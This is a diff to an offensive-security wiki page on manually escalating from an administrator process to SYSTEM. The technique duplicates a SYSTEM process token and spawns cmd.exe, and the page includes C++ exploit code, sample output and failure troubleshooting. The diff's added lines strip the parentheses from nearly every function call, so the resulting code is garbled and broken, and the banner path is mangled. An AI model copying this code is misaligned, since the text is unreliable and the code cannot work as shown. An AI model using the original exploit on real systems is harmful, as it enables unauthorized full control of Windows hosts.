@@ -1,6 +1,6 @@
 # SeImpersonate from High To System
 
-{{#include ../../banners/hacktricks-training.md}}
+{{#include ../../banners/this collection-training.md}}
 
 This page is about the **manual** version of going from a **High Integrity administrator process** to **`NT AUTHORITY\SYSTEM`** by **opening a non-protected SYSTEM process, duplicating its token, and spawning a child process with that token**.
 
@@ -82,7 +82,7 @@ BOOL SetPrivilege(
 		lpszPrivilege,   // privilege to lookup
 		&luid))        // receives LUID of privilege
 	{
-		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
+		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError);
 		return FALSE;
 	}
 	tp.PrivilegeCount = 1;
@@ -100,28 +100,28 @@ BOOL SetPrivilege(
 		(PTOKEN_PRIVILEGES)NULL,
 		(PDWORD)NULL))
 	{
-		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
+		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError);
 		return FALSE;
 	}
-	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
+	if (GetLastError == ERROR_NOT_ALL_ASSIGNED)
 	{
 		printf("[-] The token does not have the specified privilege. \n");
 		return FALSE;
 	}
 	return TRUE;
 }
-std::string get_username()
+std::string get_username
 {
 	TCHAR username[UNLEN + 1];
 	DWORD username_len = UNLEN + 1;
 	GetUserName(username, &username_len);
 	std::wstring username_w(username);
-	std::string username_s(username_w.begin(), username_w.end());
+	std::string username_s(username_w.begin, username_w.end);
 	return username_s;
 }
 int main(int argc, char** argv) {
 	// Print whoami to compare to thread later
-	printf("[+] Current user is: %s\n", (get_username()).c_str());
+	printf("[+] Current user is: %s\n", (get_username).c_str);
 	// Grab PID from command line argument
 	char* pid_c = argv[1];
 	DWORD PID_TO_IMPERSONATE = atoi(pid_c);
@@ -135,60 +135,60 @@ int main(int argc, char** argv) {
 	startupInfo.cb = sizeof(STARTUPINFO);
 	// Add SE debug privilege
 	HANDLE currentTokenHandle = NULL;
-	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
+	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
 	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
 	{
 		printf("[+] SeDebugPrivilege enabled!\n");
 	}
-	// Call OpenProcess(), print return code and error code
+	// Call OpenProcess, print return code and error code
 	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
-	if (GetLastError() == NULL)
-		printf("[+] OpenProcess() success!\n");
+	if (GetLastError == NULL)
+		printf("[+] OpenProcess success!\n");
 	else
 	{
-		printf("[-] OpenProcess() Return Code: %i\n", processHandle);
-		printf("[-] OpenProcess() Error: %i\n", GetLastError());
+		printf("[-] OpenProcess Return Code: %i\n", processHandle);
+		printf("[-] OpenProcess Error: %i\n", GetLastError);
 	}
-	// Call OpenProcessToken(), print return code and error code
+	// Call OpenProcessToken, print return code and error code
 	BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
-	if (GetLastError() == NULL)
-		printf("[+] OpenProcessToken() success!\n");
+	if (GetLastError == NULL)
+		printf("[+] OpenProcessToken success!\n");
 	else
 	{
-		printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
-		printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
+		printf("[-] OpenProcessToken Return Code: %i\n", getToken);
+		printf("[-] OpenProcessToken Error: %i\n", GetLastError);
 	}
 	// Impersonate user in a thread
 	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
-	if (GetLastError() == NULL)
+	if (GetLastError == NULL)
 	{
-		printf("[+] ImpersonatedLoggedOnUser() success!\n");
-		printf("[+] Current user is: %s\n", (get_username()).c_str());
+		printf("[+] ImpersonatedLoggedOnUser success!\n");
+		printf("[+] Current user is: %s\n", (get_username).c_str);
 		printf("[+] Reverting thread to original user context\n");
-		RevertToSelf();
+		RevertToSelf;
 	}
 	else
 	{
-		printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
-		printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
+		printf("[-] ImpersonatedLoggedOnUser Return Code: %i\n", getToken);
+		printf("[-] ImpersonatedLoggedOnUser Error: %i\n", GetLastError);
 	}
-	// Call DuplicateTokenEx(), print return code and error code
+	// Call DuplicateTokenEx, print return code and error code
 	BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
-	if (GetLastError() == NULL)
-		printf("[+] DuplicateTokenEx() success!\n");
+	if (GetLastError == NULL)
+		printf("[+] DuplicateTokenEx success!\n");
 	else
 	{
-		printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
-		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
+		printf("[-] DuplicateTokenEx Return Code: %i\n", duplicateToken);
+		printf("[-] DupicateTokenEx Error: %i\n", GetLastError);
 	}
-	// Call CreateProcessWithTokenW(), print return code and error code
+	// Call CreateProcessWithTokenW, print return code and error code
 	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
-	if (GetLastError() == NULL)
+	if (GetLastError == NULL)
 		printf("[+] Process spawned!\n");
 	else
 	{
 		printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
-		printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
+		printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError);
 	}
 	return 0;
 }
@@ -198,10 +198,10 @@ int main(int argc, char** argv) {
 
 The sample uses `MAXIMUM_ALLOWED`, but for real operations it's useful to remember the minimum pieces involved:
 
-- `OpenProcessToken()` only requires that the **process handle** was opened with **`PROCESS_QUERY_LIMITED_INFORMATION`**.
-- To use `CreateProcessWithTokenW()`, the **primary token handle** must have **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.<sup>[[1]](#references)</sup>
-- `DuplicateTokenEx()` must create a **primary token** (`TokenPrimary`), not only an impersonation token.
-- If you already impersonated SYSTEM and `CreateProcessWithTokenW()` still fails with `1314`, try `CreateProcessAsUserW()` instead.
+- `OpenProcessToken` only requires that the **process handle** was opened with **`PROCESS_QUERY_LIMITED_INFORMATION`**.
+- To use `CreateProcessWithTokenW`, the **primary token handle** must have **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.<sup>[[1]](#references)</sup>
+- `DuplicateTokenEx` must create a **primary token** (`TokenPrimary`), not only an impersonation token.
+- If you already impersonated SYSTEM and `CreateProcessWithTokenW` still fails with `1314`, try `CreateProcessAsUserW` instead.
 
 That means that **opening the target process with `PROCESS_ALL_ACCESS` is usually unnecessary and noisier** than just requesting the rights needed to query the token.
 
@@ -210,12 +210,12 @@ That means that **opening the target process with `PROCESS_ALL_ACCESS` is usuall
 On some occasions you may try to impersonate System and it won't work showing an output like the following:
 
 ```cpp
-[+] OpenProcess() success!
-[+] OpenProcessToken() success!
-[-] ImpersonatedLoggedOnUser() Return Code: 1
-[-] ImpersonatedLoggedOnUser() Error: 5
-[-] DuplicateTokenEx() Return Code: 0
-[-] DupicateTokenEx() Error: 5
+[+] OpenProcess success!
+[+] OpenProcessToken success!
+[-] ImpersonatedLoggedOnUser Return Code: 1
+[-] ImpersonatedLoggedOnUser Error: 5
+[-] DuplicateTokenEx Return Code: 0
+[-] DupicateTokenEx Error: 5
 [-] CreateProcessWithTokenW Return Code: 0
 [-] CreateProcessWithTokenW Error: 1326
 ```
@@ -242,10 +242,10 @@ Inside that process "Administrators" can "Read Memory" and "Read Permissions" wh
 
 ### Common failure causes
 
-- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: the process DACL blocks you, or the target is **protected/PPL**. Pick another SYSTEM process.
-- **`DuplicateTokenEx()` -> `5 (Access denied)`**: your token handle was opened without enough rights, or the target token DACL prevents duplication.
-- **`CreateProcessWithTokenW()` -> `1314`**: the caller doesn't currently have **`SeImpersonatePrivilege`** enabled. Try enabling it first or use `CreateProcessAsUserW()` with the duplicated primary token.
-- **`CreateProcessWithTokenW()` -> `1326`** after previous failures: this often just means the earlier token duplication/impersonation step failed, so there is no usable primary token to launch the child process.
+- **`OpenProcess` / `OpenProcessToken` -> `5 (Access denied)`**: the process DACL blocks you, or the target is **protected/PPL**. Pick another SYSTEM process.
+- **`DuplicateTokenEx` -> `5 (Access denied)`**: your token handle was opened without enough rights, or the target token DACL prevents duplication.
+- **`CreateProcessWithTokenW` -> `1314`**: the caller doesn't currently have **`SeImpersonatePrivilege`** enabled. Try enabling it first or use `CreateProcessAsUserW` with the duplicated primary token.
+- **`CreateProcessWithTokenW` -> `1326`** after previous failures: this often just means the earlier token duplication/impersonation step failed, so there is no usable primary token to launch the child process.
 
 ## Operator notes
 
@@ -261,4 +261,4 @@ Inside that process "Administrators" can "Read Memory" and "Read Permissions" wh
 - [2] [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
 - [3] [Understanding and Abusing Process Tokens — Part II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)
 
-{{#include ../../banners/hacktricks-training.md}}
+{{#include ../../banners/this collection-training.md}}
